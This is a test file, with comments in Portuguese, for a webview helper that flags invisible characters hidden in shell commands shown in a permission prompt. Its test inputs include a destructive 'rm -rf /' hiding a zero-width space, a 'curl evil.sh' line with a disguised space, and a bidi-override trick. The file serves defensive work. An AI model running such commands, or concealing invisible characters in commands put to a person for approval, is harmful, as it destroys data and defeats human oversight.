import { describe, it, expect } from 'vitest';
import { splitInvisible, hasInvisible, codeLabel, codeMark } from '../webview/src/invisible';

// O preview do prompt de permissão é lido por uma pessoa antes de aprovar a execução: o que
// está escondido no comando tem de aparecer marcado.
describe('caracteres invisíveis no comando a aprovar', () => {
  it('um comando comum não acusa nada', () => {
    expect(hasInvisible('git status --short')).toBe(false);
    expect(splitInvisible('git status')).toEqual([{ text: 'git status' }]);
  });

  it('quebra de linha é legítima e não é marcada', () => {
    expect(hasInvisible('echo a\necho b')).toBe(false);
  });

  it('zero-width no meio do comando é isolado, preservando o texto', () => {
    const cmd = 'rm​ -rf /';
    expect(hasInvisible(cmd)).toBe(true);
    const segs = splitInvisible(cmd);
    expect(segs.map((s) => s.text).join('')).toBe(cmd); // nada se perde
    expect(segs.find((s) => s.code)?.code).toBe(0x200b);
  });

  it('pega padding de tab e override bidi (os vetores que a CLI corrigiu)', () => {
    expect(hasInvisible('ls\t\t\t\t# nada a ver aqui')).toBe(true);
    expect(hasInvisible('echo ‮ drowssap')).toBe(true);
    expect(hasInvisible('curl  evil.sh')).toBe(true); // NBSP passando por espaço
  });

  it('rotula e marca o caractere', () => {
    expect(codeLabel(0x200b)).toBe('U+200B ZERO WIDTH SPACE');
    expect(codeLabel(0x1d7)).toBe('U+01D7'); // sem nome: só o codepoint
    expect(codeMark(0x09)).toBe('⇥');
    expect(codeMark(0x200b)).toBe('·');
  });
});
